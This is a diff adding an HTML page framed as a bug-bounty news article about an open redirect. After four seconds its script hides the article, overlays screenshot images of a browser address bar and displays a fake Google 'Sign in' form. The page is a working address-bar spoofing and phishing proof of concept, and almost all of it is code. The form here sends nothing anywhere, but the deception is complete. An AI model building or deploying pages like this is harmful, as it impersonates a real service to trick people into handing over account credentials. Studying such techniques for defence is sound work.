@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Bug Bounty Report - Transition Simulation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <!-- Google Fonts for styling -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+    <style>
+      /* [General Styling for Layout and Fonts] */
+      body {
+        margin: 0;
+        padding: 0;
+        min-height: 180vh;
+        font-family: "Google Sans", "Roboto", Arial, sans-serif;
+        background: #f8f8f8;
+        overflow-y: auto;
+        transition: overflow-y 0s 0.5s;
+      }
+
+      body.no-scroll {
+        overflow-y: hidden;
+      }
+
+      /* [Fake Address Bar Styling for Simulation] */
+      .fake-address-bar-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 50px;
+        background-color: white;
+        z-index: 0;
+        pointer-events: none;
+        overflow: hidden;
+      }
+
+      .fake-address-bar-container.active {
+        z-index: 9999;
+      }
+
+      .fake-address-bar-container img {
+        width: 100%;
+        height: 100%;
+        display: block;
+        object-fit: fill;
+        object-position: top center;
+        opacity: 1;
+      }
+
+      #addressImage2 {
+        opacity: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+      }
+
+      .content-area-wrapper {
+        position: relative;
+        padding-top: 0;
+        width: 100%;
+        box-sizing: border-box;
+        padding-bottom: 50px;
+      }
+
+      .content {
+        position: relative;
+        z-index: 1;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #ffffff;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .content.hidden {
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      .news-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        padding-bottom: 15px;
+        border-bottom: 1px solid #eee;
+        flex-wrap: wrap;
+      }
+
+      .news-logo {
+        font-size: 28px;
+        font-weight: 700;
+        color: #1565c0;
+        text-transform: uppercase;
+        margin-bottom: 10px;
+      }
+
+      .news-nav ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        gap: 20px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+
+      .news-nav a {
+        text-decoration: none;
+        color: #555;
+        font-weight: 500;
+        font-size: 15px;
+      }
+
+      .news-date {
+        font-size: 14px;
+        color: #777;
+        text-align: center;
+        width: 100%;
+        margin-top: -10px;
+        margin-bottom: 20px;
+      }
+
+      .main-article h1 {
+        font-size: 28px;
+        color: #202124;
+        margin-bottom: 15px;
+        font-weight: 700;
+        line-height: 1.2;
+      }
+
+      .main-article .author-date {
+        font-size: 14px;
+        color: #777;
+        margin-bottom: 20px;
+        border-bottom: 1px solid #eee;
+        padding-bottom: 10px;
+      }
+
+      .main-article img {
+        width: 100%;
+        height: auto;
+        border-radius: 6px;
+        margin-bottom: 25px;
+      }
+
+      .main-article p {
+        line-height: 1.8;
+        margin-bottom: 20px;
+        color: #333;
+        font-size: 15px;
+        text-align: justify;
+      }
+
+      .related-articles {
+        margin-top: 40px;
+        padding-top: 30px;
+        border-top: 1px solid #eee;
+      }
+
+      .related-articles h2 {
+        font-size: 22px;
+        color: #202124;
+        margin-bottom: 20px;
+        font-weight: 500;
+      }
+
+      .related-articles ul {
+        list-style: none;
+        padding: 0;
+      }
+
+      .related-articles li {
+        margin-bottom: 15px;
+      }
+
+      .related-articles a {
+        text-decoration: none;
+        color: #1a73e8;
+        font-size: 16px;
+        font-weight: 500;
+      }
+
+      .related-articles a:hover {
+        text-decoration: underline;
+      }
+
+      .loading-overlay,
+      .login-section {
+        opacity: 0;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        padding-top: 56px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #f8f8f8;
+        z-index: 2;
+        pointer-events: none;
+        transition: opacity 0.5s ease;
+      }
+
+      .loading-overlay {
+        text-align: center;
+        font-size: 24px;
+        color: #555;
+        flex-direction: column;
+      }
+
+      .loading-overlay.visible {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .login-section {
+        z-index: 3;
+      }
+
+      .login-section.visible {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .login-form {
+        background-color: white;
+        padding: 48px;
+        border-radius: 8px;
+        box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+        width: 100%;
+        max-width: 450px;
+        text-align: center;
+        border: 1px solid #dadce0;
+        box-sizing: border-box;
+      }
+
+      .login-form .logo {
+        margin-bottom: 24px;
+      }
+
+      .login-form .logo img {
+        width: 80px;
+        height: auto;
+      }
+
+      .login-form h2 {
+        margin-bottom: 8px;
+        color: #202124;
+        font-size: 24px;
+        font-weight: normal;
+      }
+
+      .login-form p.subtitle {
+        color: #202124;
+        font-size: 16px;
+        margin-bottom: 24px;
+      }
+
+      .input-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+
+      .input-group input[type="text"],
+      .input-group input[type="password"] {
+        width: 100%;
+        padding: 15px 14px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 16px;
+        color: #202124;
+        box-sizing: border-box;
+      }
+
+      .login-form button {
+        min-width: 96px;
+        padding: 10px 24px;
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="fake-address-bar-container" id="fakeAddressBar">
+      <img src="1.jpg" alt="Fake Address Bar 1" id="addressImage1" />
+      <img src="address-bar-firefox.jpeg" alt="Fake Address Bar 2" id="addressImage2" />
+    </div>
+
+    <div class="content-area-wrapper" id="contentAreaWrapper">
+      <div class="content" id="mainContent">
+        <div class="news-header">
+          <div class="news-logo">Bug Bounty Brief</div>
+          <nav class="news-nav">
+            <ul>
+              <li><a href="#">Reports</a></li>
+              <li><a href="#">Hall of Fame</a></li>
+              <li><a href="#">Programs</a></li>
+              <li><a href="#">Guides</a></li>
+            </ul>
+          </nav>
+        </div>
+        <div class="news-date">Thursday, July 27, 2025 | 10:11 AM WIB</div>
+
+        <div class="main-article">
+          <h1>Critical Account Takeover via Open Redirect on Major Platform</h1>
+          <p class="author-date">By: Frozzipies | Published: July 27, 2025</p>
+          <img src="gyokeres.jpeg" alt="Bug Bounty Main Report" />
+          <p>
+            A recent bug bounty submission revealed a critical open redirect vulnerability that could be chained to compromise user accounts. This issue was found on a high-profile web platform used by millions of users worldwide.
+          </p>
+          <p>
+            The vulnerability allowed attackers to redirect users to malicious phishing pages by manipulating URL parameters. If combined with token leakage or social engineering, it could lead to a full account takeover.
+          </p>
+          <p>
+            The researcher responsibly disclosed the bug to the vendor, which promptly patched the issue. A bounty reward of $7,500 was issued.
+          </p>
+          <p>
+            Bug bounty programs continue to serve as a crucial line of defense in modern cybersecurity, enabling platforms to leverage the community for early vulnerability discovery.
+          </p>
+        </div>
+
+        <div class="related-articles">
+          <h2>Related Reports</h2>
+          <ul>
+            <li><a href="#">IDOR in Finance App Exposes User Balances</a></li>
+            <li><a href="#">Stored XSS on Admin Panel Rewarded $10,000</a></li>
+            <li><a href="#">SSRF Chain Bypasses Firewall to Access Metadata</a></li>
+          </ul>
+        </div>
+        <p style="text-align: center; margin-top: 40px; color: #777">
+          Scroll down further to see the bug bounty login simulation.
+        </p>
+      </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">Loading...</div>
+
+    <div class="login-section" id="loginFormSection">
+      <form class="login-form">
+        <div class="logo">
+          <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" />
+        </div>
+        <h2>Sign in</h2>
+        <p class="subtitle">Use your Google account</p>
+        <div class="input-group">
+          <input type="text" id="username" name="username" placeholder="Email / Password" required />
+        </div>
+        <a href="#" class="link-forgot-password">Forgot account?</a>
+        <div class="actions">
+          <button type="submit">Next</button>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      // Bug bounty themed page transition logic
+      window.addEventListener("load", () => {
+        const fakeBar = document.getElementById("fakeAddressBar");
+        const addressImage1 = document.getElementById("addressImage1");
+        const addressImage2 = document.getElementById("addressImage2");
+        const mainContent = document.getElementById("mainContent");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const loginFormSection = document.getElementById("loginFormSection");
+        const contentAreaWrapper = document.getElementById("contentAreaWrapper");
+        const body = document.body;
+
+        window.scrollTo({ top: 1, behavior: "smooth" });
+
+        setTimeout(() => {
+          window.scrollTo(0, 0);
+          body.classList.add("no-scroll");
+          fakeBar.classList.add("active");
+          mainContent.classList.add("hidden");
+
+          setTimeout(() => {
+            addressImage1.style.opacity = "0";
+            addressImage2.style.opacity = "1";
+            loadingOverlay.classList.add("visible");
+
+            setTimeout(() => {
+              loadingOverlay.classList.remove("visible");
+              loadingOverlay.style.opacity = "0";
+              loadingOverlay.style.pointerEvents = "none";
+              contentAreaWrapper.style.display = "none";
+              loginFormSection.classList.add("visible");
+              body.classList.add("no-scroll");
+            }, 1500);
+          }, 21);
+        }, 4000);
+      });
+    </script>
+  </body>
+</html>
